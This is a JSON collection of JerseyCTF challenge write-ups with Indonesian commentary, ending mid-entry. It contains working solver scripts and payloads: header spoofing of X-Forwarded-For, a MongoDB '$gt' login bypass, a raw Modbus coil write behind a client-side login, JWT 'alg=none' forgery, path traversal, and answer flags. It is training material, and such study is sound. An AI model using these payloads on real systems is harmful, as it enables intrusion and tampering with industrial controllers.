        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\nfrom pathlib import Path\r\n\r\nFLAG_RE = re.compile(r\"jctf\\{[^\\n\\r\\t\\x00}]+\\}\")\r\n\r\n\r\ndef run(cmd):\r\n    return subprocess.run(cmd, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\r\n\r\n\r\ndef decode_kcs(signal_path: Path) -> str:\r\n    # Kansas City Standard-like decode: 300 baud, 1200/2400 Hz\r\n    proc = run([\r\n        \"minimodem\",\r\n        \"--rx\",\r\n        \"-f\",\r\n        str(signal_path),\r\n        \"300\",\r\n        \"-M\",\r\n        \"2400\",\r\n        \"-S\",\r\n        \"1200\",\r\n        \"--startbits\",\r\n        \"1\",\r\n        \"--stopbits\",\r\n        \"2\",\r\n        \"-8\",\r\n        \"-q\",\r\n    ])\r\n    out = proc.stdout.decode(\"latin-1\", errors=\"ignore\")\r\n    m = FLAG_RE.search(out)\r\n    if not m:\r\n        raise ValueError(\"flag tidak ditemukan pada output minimodem\")\r\n    return m.group(0)\r\n\r\n\r\ndef main():\r\n    parser = argparse.ArgumentParser(description=\"Solve JerseyCTF misc - Recovered Tape\")\r\n    parser.add_argument(\"input\", nargs=\"?\", default=\"clip.wav\", help=\"path ke file wav challenge\")\r\n    args = parser.parse_args()\r\n\r\n    inp = Path(args.input)\r\n    if not inp.exists():\r\n        print(f\"[!] file tidak ditemukan: {inp}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n    try:\r\n        with tempfile.TemporaryDirectory() as td:\r\n            td = Path(td)\r\n            right = td / \"right.wav\"\r\n            signal = td / \"signal.wav\"\r\n\r\n            # Ambil kanal kanan karena payload ada di channel ini.\r\n            run([\"sox\", str(inp), str(right), \"remix\", \"2\"])\r\n            # Potong area sinyal data yang terlihat jelas di spectrogram.\r\n            run([\"sox\", str(right), str(signal), \"trim\", \"7.7\", \"=10.0\"])\r\n\r\n            flag = decode_kcs(signal)\r\n            print(flag)\r\n    except subprocess.CalledProcessError as e:\r\n        print(\"[!] command gagal:\", \" \".join(e.cmd), file=sys.stderr)\r\n        if e.stderr:\r\n            print(e.stderr.decode(\"utf-8\", errors=\"ignore\"), file=sys.stderr)\r\n        sys.exit(1)\r\n    except Exception as e:\r\n        print(f\"[!] {e}\", file=sys.stderr)\r\n        sys.exit(1)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{buy_0ne_g3t_0ne_fr33}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-misc-uranusbastion",
    "title": "CTF — Uranus Bastion",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Misc  \n**Difficulty:** Medium  \n**Flag:** `jctf{the_lattice_trusts_the_surface_not_the_soul}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **Trust Profile Replay** | Gate masih menerima profil maintenance lama jika header/body cocok |\n| 2 | **Weak Origin Validation** | Reliance ke `X-Forwarded-For` + `X-Origin-Port` yang bisa dipalsukan klien |\n| 3 | **Deterministic Payload Acceptance** | Cukup match format + hash payload untuk lolos inspeksi |\n\n---",
    "tools": [
      "curl",
      "xxd",
      "sha256sum",
      "unzip",
      "Python 3 ("
    ],
    "analysis": "File yang tersedia:\n- `maintenance_window.log`\n- `transit_manifest.txt`\n- `sync_probe.bin`\n- folder `payload_fragments/phase_*.hex`\n\nPetunjuk penting yang didapat:\n- Origin port maintenance: `42107`\n- Forwarded maintenance sector valid: `10.10.42.0/24`\n- Parser masih `plain-text mode`\n- Fragmen harus di-stitch dengan urutan phase naik\n- Coating class: `ALPHA`\n- Encoding fragment: `hex`\n- SHA256 payload yang diharapkan:\n  `42aa6f011ec28d2198f81407ea91217897c712ca214ef859b068b91623d31abe`",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The Uranus Orbital Defense Lattice guards the next hop inward. A decommissioned staging node was recovered after a failed maintenance sync, and its remnants may describe the one shipment profile the lattice still accepts. Reconstruct the protocol, rebuild the accepted coating sample, and slip your payload through the barrier.\n\n**Target:** `http://uranus-bastion.aws.jerseyctf.com:8080/`\n\n---"
      },
      {
        "title": "Step 1 — Cek Endpoint Awal",
        "content": "Response JSON nunjukin service aktif dan endpoint pentingnya:\n- Method: `POST`\n- Endpoint: `/upload`\n- Rejection reason disembunyikan dari operator remote\n\nIni berarti kita harus kirim request yang benar dari sisi format/header/body, bukan berharap error message membantu.",
        "code": "curl -i http://uranus-bastion.aws.jerseyctf.com:8080/"
      },
      {
        "title": "Step 3 — Reverse Header/Protocol dari `sync_probe.bin`",
        "content": "`xxd sync_probe.bin` memperlihatkan string-string penting:\n- `/upload`\n- `User-Agent`\n- `UranusSync/2.4-beta` dan `UranusSync/2.3`\n- `X-Forwarded-For`\n- `X-Origin-Port`\n- `X-Coating-Class`\n- `X-Filename`\n- `coating_layer_alpha.dat`\n- `Content-Type`\n- `text/plain`\n\nIni menguatkan bahwa validasi service berbasis profil request (header + body), bukan cuma body.\n\n---"
      },
      {
        "title": "Step 4 — Rekonstruksi Payload dari Fragment",
        "content": "Gabungkan file `phase_*.hex` secara ascending, lalu decode hex menjadi plaintext.\n\n\n\nHasil payload:\n\n\n\nVerifikasi hash:\n\n\n\nHash cocok persis dengan `EXPECTED_SHA256` di manifest.",
        "code": "for f in $(ls payload_fragments/phase_*.hex | sort); do tr -d '\\n' < \"$f\"; done | xxd -r -p"
      },
      {
        "title": "Step 5 — Kirim Request Sesuai Profil Trust",
        "content": "Header yang dipakai:\n- `User-Agent: UranusSync/2.3`\n- `X-Forwarded-For: 10.10.42.77` (masuk subnet 10.10.42.0/24)\n- `X-Origin-Port: 42107`\n- `X-Coating-Class: ALPHA`\n- `X-Filename: coating_layer_alpha.dat`\n- `Content-Type: text/plain`\n\nBody: payload hasil rekonstruksi di atas.\n\nResponse sukses: service ngasih attachment ZIP `uranus_gate.zip` yang berisi `FLAG.txt`."
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "Artifacts lokal (log + manifest + probe + fragments)\n      |\n      v\nRekonstruksi protokol header + body canonical\n      |\n      v\nSusun payload dari phase_*.hex (ascending) + verifikasi SHA256\n      |\n      v\nPOST /upload dengan maintenance profile yang valid\n      |\n      v\nDapat uranus_gate.zip\n      |\n      v\nExtract FLAG.txt\n      |\n      v\njctf{the_lattice_trusts_the_surface_not_the_soul}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport hashlib\r\nimport io\r\nimport re\r\nimport urllib.request\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\n\r\nBASE_URL = \"http://uranus-bastion.aws.jerseyctf.com:8080/upload\"\r\nEXPECTED_SHA256 = \"42aa6f011ec28d2198f81407ea91217897c712ca214ef859b068b91623d31abe\"\r\n\r\n\r\ndef build_payload(base_dir: Path) -> bytes:\r\n    fragments_dir = base_dir / \"payload_fragments\"\r\n    parts = []\r\n    for path in sorted(fragments_dir.glob(\"phase_*.hex\")):\r\n        parts.append(path.read_text().strip())\r\n    payload = bytes.fromhex(\"\".join(parts))\r\n    digest = hashlib.sha256(payload).hexdigest()\r\n    if digest != EXPECTED_SHA256:\r\n        raise ValueError(f\"sha256 mismatch: {digest}\")\r\n    return payload\r\n\r\n\r\ndef send_payload(payload: bytes) -> bytes:\r\n    headers = {\r\n        \"User-Agent\": \"UranusSync/2.3\",\r\n        \"X-Forwarded-For\": \"10.10.42.77\",\r\n        \"X-Origin-Port\": \"42107\",\r\n        \"X-Coating-Class\": \"ALPHA\",\r\n        \"X-Filename\": \"coating_layer_alpha.dat\",\r\n        \"Content-Type\": \"text/plain\",\r\n    }\r\n    req = urllib.request.Request(BASE_URL, data=payload, headers=headers, method=\"POST\")\r\n    with urllib.request.urlopen(req, timeout=20) as resp:\r\n        return resp.read()\r\n\r\n\r\ndef extract_flag(zip_bytes: bytes) -> str:\r\n    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:\r\n        text = zf.read(\"FLAG.txt\").decode(errors=\"replace\").strip()\r\n    m = re.search(r\"(jctf\\{[^}]+\\})\", text)\r\n    if not m:\r\n        raise ValueError(\"flag not found in FLAG.txt\")\r\n    return m.group(1)\r\n\r\n\r\ndef main() -> None:\r\n    base_dir = Path(__file__).resolve().parent\r\n    payload = build_payload(base_dir)\r\n    zip_bytes = send_payload(payload)\r\n    (base_dir / \"uranus_gate.zip\").write_bytes(zip_bytes)\r\n    flag = extract_flag(zip_bytes)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{the_lattice_trusts_the_surface_not_the_soul}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-osint-thejovian",
    "title": "CTF — The Jovian Graveyard",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** OSINT / Forensics  \n**Difficulty:** Medium  \n**Flag:** `jctf{H1M4L14_TH3_F0RG3_M4ST3R}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | OSINT / Lore Analysis | Tiga clue faktual tentang bulan Himalia disembunyikan di dokumen fiksi |\n| 2 | Steganographic Breadcrumb | Nama bulan bocor langsung di log transcript sebagai flavor text |\n| 3 | OpenSSL AES-256-CBC | File terenkripsi dibuka menggunakan kunci yang diderivasi dengan PBKDF2 |\n\n---",
    "tools": [
      "file",
      "openssl",
      "Manual OSINT — cross-reference katalog bulan NASA/JPL"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> A fragmented Orion report and a damaged transcript from the Jovian system reference a forge built on one of Jupiter's moons. The forge refined Mnemosyne at industrial scale before it was lost. Identify the moon, derive the site-access key, and unlock the final harvest record.\n\n**Files provided:**\n- `OR_DIV_RES_901.txt` — Orion navigation archive fragment with data points and encryption protocol\n- `JUPITER_TRANSCRIPT_FRAGMENT.log` — Recovered audio log from Black Box 09-H\n- `SUCCESS_HARVEST_COMPLETE.enc` — OpenSSL-encrypted harvest record (the target)\n\n---"
      },
      {
        "title": "Step 1 — Read OR_DIV_RES_901.txt",
        "content": "Dokumen arsip Orion menyebutkan tiga data point untuk mengidentifikasi bulan Jupiter, sekaligus format kunci enkripsi:\n\n| Clue | Extracted Value |\n|------|----------------|\n| Discovery date | Late 1904 (Perrine Expedition) |\n| Orbital radius | ~11,460,000 km dari pusat Jupiter |\n| Classification | Anggota terbesar dari kelompok orbitalnya |\n| Key format | `[MoonName]_[Year]_[DistanceKM]` |"
      },
      {
        "title": "Step 2 — Read JUPITER_TRANSCRIPT_FRAGMENT.log",
        "content": "Di dalam log audio terdapat breadcrumb tersembunyi pada bagian komentar NAV-UNIT:\n\n\n\nNama bulan langsung disebutkan: **Himalia**. Transkrip berfungsi ganda — sebagai lore dan sebagai petunjuk OSINT.",
        "code": "\"They destroyed the Himalia Forge to stop the very progress you are now helping me restore.\""
      },
      {
        "title": "Step 3 — Verify Moon Identity",
        "content": "Cross-reference semua clue dengan data bulan Jovian yang diketahui:\n\n| Data Point | Clue | Himalia Match |\n|---|---|---|\n| Discovery | 1904, Perrine Expedition | Ditemukan Charles Perrine, 3 Desember 1904 ✔ |\n| Orbital Radius | ~11,460,000 km | Mean orbital radius ~11,461,000 km ✔ |\n| Classification | Terbesar di kelompok orbitalnya | Anggota terbesar Himalia group (prograde irregular satellites) ✔ |\n\nSemua clue cocok → **Moon = Himalia**\n\n---"
      },
      {
        "title": "Step 4 — Derive the Decryption Key",
        "content": "Menggunakan format kunci dari `OR_DIV_RES_901.txt`:",
        "code": "KEY FORMAT : [MoonName]_[Year]_[DistanceKM]\nKEY        : Himalia_1904_11460000"
      },
      {
        "title": "Step 5 — Identify Encryption Type",
        "content": "File adalah OpenSSL symmetric-key encrypted blob. Gunakan `openssl enc` dengan kunci yang sudah diderivasi sebagai passphrase.",
        "code": "file SUCCESS_HARVEST_COMPLETE.enc"
      },
      {
        "title": "Step 6 — Decrypt the File",
        "content": "Output:\n\n\n\n---",
        "code": "openssl enc -aes-256-cbc -d -pbkdf2 \\\n  -pass pass:\"Himalia_1904_11460000\" \\\n  -in SUCCESS_HARVEST_COMPLETE.enc"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "OR_DIV_RES_901.txt + JUPITER_TRANSCRIPT_FRAGMENT.log\n                        │\n                        ▼\n        OSINT: Identifikasi Himalia\n     (discovery 1904, orbital radius, group)\n                        │\n                        ▼\n         Moon=Himalia | Year=1904 | Dist=11460000\n                        │\n                        ▼\n          Key: Himalia_1904_11460000\n                        │\n                        ▼\n    openssl enc -aes-256-cbc -d -pbkdf2 ...\n                        │\n                        ▼\n        jctf{H1M4L14_TH3_F0RG3_M4ST3R}"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{H1M4L14_TH3_F0RG3_M4ST3R}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-awesome2",
    "title": "CTF — Awesome Awesome 2",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `jctf{MANG0S}`",
    "problemDescription": "**Event:** JerseyCTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `jctf{MANG0S}`\n\n---",
    "tools": [],
    "analysis": "The root page (`/`) redirects unauthenticated users to `login.html` via a client-side fetch to `/api/me`. The flag is delivered through this same endpoint — but only if the session belongs to an admin:\n\n```javascript\nfetch('/api/me')\n  .then(res => { ... })\n  .then(data => {\n    document.getElementById('username').textContent = data.username;\n    if (data.flag) document.getElementById('flag').textContent = 'Flag: ' + data.flag;\n  });\n```",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Awesome Awesome needs your help... he is in space this time! Awesome Awesome wants your help breaking into awful awful's space station as an admin account. And remember, its all about the friends we make along the way.\n>\n> **Hint:** Awesome Awesome heard Awful Awful loves to use MongoDB.\n\n---"
      },
      {
        "title": "Step 2 — Identify the Login Endpoint",
        "content": "Inspecting `login.html` source reveals the login form POSTs JSON to `/api/login`:",
        "code": "curl -si http://awesome-awesome-2.aws.jerseyctf.com/login.html | grep -i 'fetch\\|api'"
      },
      {
        "title": "Step 3 — Note the MongoDB Hint",
        "content": "The challenge hint explicitly states the backend uses **MongoDB**. Combined with a JSON-accepting login endpoint, this is a strong signal for **NoSQL Injection** using MongoDB query operators.\n\n---"
      },
      {
        "title": "Step 4 — NoSQL Injection on Login",
        "content": "MongoDB query operators like `$gt` (greater than) can be injected into JSON login bodies. The payload:\n\n\n\nThis tells MongoDB to find a user where `username = \"admin\"` AND `password > \"\"` — which is true for any non-empty password string, effectively bypassing authentication entirely.\n\n\n\nResponse:\n\n\nA valid JWT for `username: \"admin\"` is returned.",
        "code": "{\n  \"username\": \"admin\",\n  \"password\": { \"$gt\": \"\" }\n}"
      },
      {
        "title": "Attack Flow",
        "content": "",
        "code": "Enumerate / → redirects to login.html\n        │\n        ▼\nInspect login.html → POST /api/login (JSON body)\n        │\n        ▼\nHint: MongoDB backend → try NoSQL operator injection\n        │\n        ▼\nPOST /api/login\n  { \"username\": \"admin\", \"password\": { \"$gt\": \"\" } }\n        │\n        ▼\nMongoDB query matches admin user (password > \"\" = true)\n        │\n        ▼\nServer returns JWT for admin session\n        │\n        ▼\nGET /api/me -H \"Authorization: Bearer <token>\"\n        │\n        ▼\n{ \"username\": \"admin\", \"flag\": \"jctf{MANG0S}\" }"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{MANG0S}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-how-do-i-write",
    "title": "CTF — how-do-i-write",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Web / ICS  \n**Difficulty:** Medium  \n**Flag:** `jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88qfM3xKfUcs2YqmEvXV-zv9oSlQIJ17dxyXaD}`",
    "problemDescription": "| # | Vulnerability | Detail |\n|---|---|---|\n| 1 | **Client-side authorization bypass** | Login validasi dilakukan di JavaScript, bukan di server |\n| 2 | **Unsafe low-level endpoint exposure** | `raw.php` bisa diakses langsung dan menerima command Modbus write |\n| 3 | **Privilege boundary broken by protocol path** | Web/API sengaja blok toggle debug, tapi raw backend tetap mengizinkan |\n| 4 | **State tied to connection lifecycle** | Sandbox per-TCP connection bisa dieksploitasi kalau attacker paham keep-alive |\n\n---",
    "tools": [
      "curl",
      "tesseract",
      "pdftoppm",
      "Python",
      "struct"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> We're trying to collect some debug information from our ventilation systems. Unfortunately the company that made them has since gone out of business. All we have is this old copy of a service manual. Are you able to get us the information we need?\n>\n> NOTE: Due to our method of sandboxing, a new instance of this challenge is spawned for every TCP connection. Make sure your payload uses a persistent connection.\n\n**URL:** `http://how-do-i-write.aws.jerseyctf.com`\n\n---"
      },
      {
        "title": "Step 1 — Bypass Login via Client-Side Check",
        "content": "Halaman awal meminta login. Setelah lihat `login.js`, validasi credential ternyata full di client-side:\n\n\n\nArtinya kita bisa langsung akses:\n\n\n\nTidak ada server-side auth beneran untuk endpoint API/raw.",
        "code": "[\"b3BlcmF0b3IxOnBhc3N3b3Jk\",\"b3BlcmF0b3IyOnBhc3N3b3Jk\"].indexOf(btoa(username+\":\"+password))>-1\n  ? window.location.replace(\"/index.php?authorized=1\")\n  : alert(\"INVALID CREDENTIALS\")"
      },
      {
        "title": "Step 2 — Inspect JavaScript (Hint)",
        "content": "Di halaman utama ada `hvac.js`. Dari file ini kelihatan dua jalur komunikasi:\n\n1. `api.php?op=...` untuk operasi normal (get temp, get fanspeed, set setpoint, dll)\n2. `raw.php` untuk request binary low-level (Modbus-like frame)\n\nPotongan penting:\n\n\n\nDan ada helper function code:\n- `0x01` read coils\n- `0x02` read discrete inputs\n- `0x03` read holding regs\n- `0x04` read input regs",
        "code": "function p(unit,payload,cb){\n  ...\n  xhr.open(\"POST\",\"raw.php\",true)\n  xhr.setRequestHeader(\"Content-Type\",\"application/octet-stream\")\n}"
      },
      {
        "title": "Step 3 — Analyze Service Manual PDF",
        "content": "Dari `manual.pdf` (OCR), bagian paling penting:\n\n- **Coil `00062` = Debug Bit**\n- **Input Registers `30031..30050` = System Messages**\n- Saat debug bit = 1, area message diisi debug information\n- Catatan: `api.php` dan web panel **tidak bisa toggle debug bit**\n\nIni jadi jalur eksploitasi utama: pakai `raw.php` untuk set coil debug.\n\n---"
      },
      {
        "title": "Step 4 — Map Register Addressing",
        "content": "`hvac.js` manggil read input register untuk message pakai address `30` panjang `20`.\n\nKenapa? Karena mapping Modbus biasanya:\n- 30031 (manual) -> address zero-based `30`\n- total 20 register = 30031..30050"
      },
      {
        "title": "Step 5 — Toggle Debug Bit via Raw Modbus Write",
        "content": "Gunakan function `0x05` (Write Single Coil):\n- Coil 00062 -> address `61`\n- ON value `0xFF00`\n\nFrame dibuat seperti di `hvac.js` (MBAP + PDU), dikirim ke `POST /raw.php`."
      },
      {
        "title": "Step 6 — Critical Requirement: Persistent TCP Connection",
        "content": "Ini bagian yang paling bikin jebakan challenge.\n\nServer spawn instance baru setiap TCP koneksi baru. Jadi kalau:\n- request 1: set debug\n- request 2: read message\n\n...tapi dilakukan pakai dua koneksi berbeda, state debug hilang karena request kedua masuk instance baru.\n\nSolusinya: kirim semua request dalam **satu koneksi HTTP keep-alive** ke `raw.php`."
      },
      {
        "title": "Step 7 — Dump Debug Messages from Unit 1 and Unit 2",
        "content": "Setelah debug bit ON:\n- Unit 1 message berisi prefix `P1:` + setengah flag\n- Unit 2 message berisi prefix `P2:` + setengah flag\n\nContoh output solver:\n\n\n\n---",
        "code": "[+] Unit 1: P1: jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88q\n[+] Unit 2: P2: fM3xKfUcs2YqmEvXV-zv9oSlQIJ17dxyXaD}\n[+] Flag: jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88qfM3xKfUcs2YqmEvXV-zv9oSlQIJ17dxyXaD}"
      },
      {
        "title": "Remediation",
        "content": "1. Pindahkan auth sepenuhnya ke server-side session/token validation\n2. Lindungi `raw.php` dengan auth + authorization ketat (bukan public endpoint)\n3. Batasi function code yang boleh dipakai dari web tier (deny write coil/register)\n4. Pisahkan jaringan management/debug channel dari user-facing app\n5. Audit semua jalur akses non-UI (direct protocol bridge) sebelum production\n\n---"
      },
      {
        "title": "Attack Flow",
        "content": "---",
        "code": "Inspect login.js\n    │\n    ▼\nBypass login with /index.php?authorized=1\n    │\n    ▼\nInspect hvac.js → discover raw.php binary Modbus bridge\n    │\n    ▼\nRead manual.pdf → find Debug Bit (coil 00062) + message regs (30031..30050)\n    │\n    ▼\nOpen single persistent TCP connection\n    │\n    ▼\nWrite coil 61 (debug=1) on unit 1 and unit 2\n    │\n    ▼\nRead input regs address 30 length 20\n    │\n    ▼\nGet P1 + P2 and concatenate\n    │\n    ▼\njctf{...}"
      },
      {
        "title": "Catatan",
        "content": "Flag bisa berbeda antar run karena environment challenge di-spawn ulang per koneksi TCP. Yang penting adalah metode eksploitasinya: **toggle debug + read message pada koneksi yang sama**."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport socket\r\nimport struct\r\n\r\nHOST = \"how-do-i-write.aws.jerseyctf.com\"\r\nPORT = 80\r\n\r\n\r\ndef recv_http_response(sock: socket.socket) -> bytes:\r\n    data = b\"\"\r\n    while b\"\\r\\n\\r\\n\" not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            raise RuntimeError(\"Socket closed while reading headers\")\r\n        data += chunk\r\n\r\n    header, body = data.split(b\"\\r\\n\\r\\n\", 1)\r\n    lines = header.decode(\"latin1\").split(\"\\r\\n\")\r\n\r\n    if not lines or \"200\" not in lines[0]:\r\n        raise RuntimeError(f\"Bad status line: {lines[0] if lines else 'N/A'}\")\r\n\r\n    content_length = None\r\n    for line in lines[1:]:\r\n        if line.lower().startswith(\"content-length:\"):\r\n            content_length = int(line.split(\":\", 1)[1].strip())\r\n            break\r\n\r\n    if content_length is None:\r\n        raise RuntimeError(\"No Content-Length in response\")\r\n\r\n    while len(body) < content_length:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            raise RuntimeError(\"Socket closed while reading body\")\r\n        body += chunk\r\n\r\n    return body[:content_length]\r\n\r\n\r\ndef post_raw_keepalive(sock: socket.socket, payload: bytes) -> bytes:\r\n    req = (\r\n        b\"POST /raw.php HTTP/1.1\\r\\n\"\r\n        + f\"Host: {HOST}\\r\\n\".encode()\r\n        + b\"Connection: keep-alive\\r\\n\"\r\n        + b\"Content-Type: application/octet-stream\\r\\n\"\r\n        + f\"Content-Length: {len(payload)}\\r\\n\".encode()\r\n        + b\"\\r\\n\"\r\n        + payload\r\n    )\r\n    sock.sendall(req)\r\n    return recv_http_response(sock)\r\n\r\n\r\ndef modbus(sock: socket.socket, unit: int, function_code: int, address: int, value: int) -> bytes:\r\n    pdu = bytes([function_code]) + struct.pack(\">HH\", address, value)\r\n    mbap = struct.pack(\">HHHB\", 1, 0, len(pdu) + 1, unit)\r\n    raw_resp = post_raw_keepalive(sock, mbap + pdu)\r\n    return raw_resp[7:]  # Skip MBAP response header\r\n\r\n\r\ndef read_message_block(sock: socket.socket, unit: int) -> str:\r\n    # Input register 30031 maps to address 30 (zero-based), read 20 regs (30031..30050)\r\n    pdu = modbus(sock, unit, 0x04, 30, 20)\r\n    if len(pdu) < 2 or pdu[0] != 0x04:\r\n        raise RuntimeError(f\"Unexpected read response from unit {unit}: {pdu.hex()}\")\r\n\r\n    byte_count = pdu[1]\r\n    data = pdu[2 : 2 + byte_count]\r\n    return \"\".join(chr(b) if 32 <= b <= 126 else \"\" for b in data)\r\n\r\n\r\ndef enable_debug(sock: socket.socket, unit: int) -> None:\r\n    # Coil 00062 => address 61, set ON with 0xFF00\r\n    pdu = modbus(sock, unit, 0x05, 61, 0xFF00)\r\n    if len(pdu) < 5 or pdu[0] != 0x05:\r\n        raise RuntimeError(f\"Failed to set debug bit on unit {unit}: {pdu.hex()}\")\r\n\r\n\r\ndef main() -> None:\r\n    with socket.create_connection((HOST, PORT)) as sock:\r\n        enable_debug(sock, 1)\r\n        part1 = read_message_block(sock, 1)\r\n\r\n        enable_debug(sock, 2)\r\n        part2 = read_message_block(sock, 2)\r\n\r\n    p1 = part1.split(\"P1:\", 1)[1].strip() if \"P1:\" in part1 else part1.strip()\r\n    p2 = part2.split(\"P2:\", 1)[1].strip() if \"P2:\" in part2 else part2.strip()\r\n    flag = p1 + p2\r\n\r\n    print(\"[+] Unit 1:\", part1)\r\n    print(\"[+] Unit 2:\", part2)\r\n    print(\"[+] Flag:\", flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "jctf{VQsLCvjzdo2W8Rq0-9MDzvkvUmlI88qfM3xKfUcs2YqmEvXV-zv9oSlQIJ17dxyXaD}",
    "lessonsLearned": ""
  },
  {
    "id": "jerseyctf-web-mnemosynelattice",
    "title": "CTF — Mnemosyne Lattice (NME-Ω)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "JerseyCTF",
    "tags": [],
    "description": "**Event:** JerseyCTF  \n**Category:** Web  \n**Difficulty:** Medium  \n**Flag:** `jctf{mnemosyne_remembers_even_when_humans_forget}`",
    "problemDescription": "| # | Technique | Detail |\n|---|---|---|\n| 1 | **JWT none-alg forgery** | Server menerima token unsigned dan percaya claim `role` |\n| 2 | **Authorization logic flaw** | Role `o-dev` memicu jalur internal review replay |\n| 3 | **Sensitive header disclosure** | Kredensial admin bocor via `X-Operator-Creds` |\n| 4 | **Path traversal in archive read** | `arccat archives/public/../private/...` bisa baca file private |\n| 5 | **Weak upload validation** | “material verification” hanya cek ekstensi `.mnemo` |\n\n---",
    "tools": [
      "curl",
      "Python (",
      "parsing sederhana regex/header extraction"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> Neptune was never a colony; it was Orion's mediation node, built to preserve reference states long after operators were gone. Its degraded interfaces still hold records about the material that made the gate network possible. Explore the system, understand its trust model, and recover what Orion sealed inside the archive.\n\n**Target:** `http://mnemosyne-lattice.aws.jerseyctf.com`\n\n---"
      },
      {
        "title": "Step 1 — Initial Endpoint Mapping",
        "content": "Akses root mengarah ke `/neptune/`.\n\n\n\nDi source HTML `/neptune/` ada komentar internal yang sangat penting:\n\n- JWT `alg=none` diterima di mode degraded\n- role diambil dari payload token\n- endpoint kunci:\n  - `POST /neptune/api/request_new.php`\n  - `POST /neptune/api/request_submit.php`\n  - `GET /neptune/review.php?id=<request_id>`\n  - `GET /neptune/api/captures.php`\n- known issues:\n  - authority replay leak header internal\n  - legacy developer tokens masih dipercaya",
        "code": "curl -i http://mnemosyne-lattice.aws.jerseyctf.com/"
      },
      {
        "title": "Step 2 — Validate JWT Weakness",
        "content": "Endpoint token mengeluarkan JWT unsigned (`alg: none`).\n\n\n\nIni mengonfirmasi kita bisa forge token sendiri dan mengatur `role` secara arbitrer.\n\n---",
        "code": "curl -s -X POST http://mnemosyne-lattice.aws.jerseyctf.com/neptune/api/request_new.php"
      },
      {
        "title": "Step 3 — Forge Role `o-dev` and Trigger Review Replay",
        "content": "Kita forge JWT:\n\n- header: `{\"typ\":\"JWT\",\"alg\":\"none\"}`\n- payload: role `o-dev`\n\nLalu kirim body ke `request_submit.php`, ambil `request_id`, dan akses:\n\n\n\nPada response review untuk request dengan role `o-dev`, server membocorkan header:\n\n- `X-Operator-Creds: neptune_admin:NPT-AX13-RELAY`\n- `X-Authority-Console: /console/login.php`\n\nIni adalah kredensial authority console.",
        "code": "GET /neptune/review.php?id=<request_id>"
      },
      {
        "title": "Step 4 — Login Authority Console",
        "content": "Gunakan kredensial bocor:\n\n- username: `neptune_admin`\n- password: `NPT-AX13-RELAY`\n\nLogin berhasil dan diarahkan ke:\n\n`/console/terminal.php`\n\nTerminal ini punya command archive:\n\n- `arhls`\n- `arccat`\n- `upload`"
      },
      {
        "title": "Step 5 — Bypass Material Verification",
        "content": "Di public archive ada petunjuk validator private:\n\n- `archives/public/upload.php` mereferensikan `archives/private/upload_filter.php`\n\nDengan path traversal pada command `arccat`, file private bisa dibaca:\n\n\n\nArtinya validasi hanya cek suffix nama file `.mnemo`.\n\nUpload file apapun dengan filename berakhiran `.mnemo` lewat command `upload`, maka sealed vault terbuka.",
        "code": "function validateArtifact(string $filename): bool {\n    return str_ends_with($filename, '.mnemo');\n}"
      },
      {
        "title": "Attack Flow",
        "content": "---",
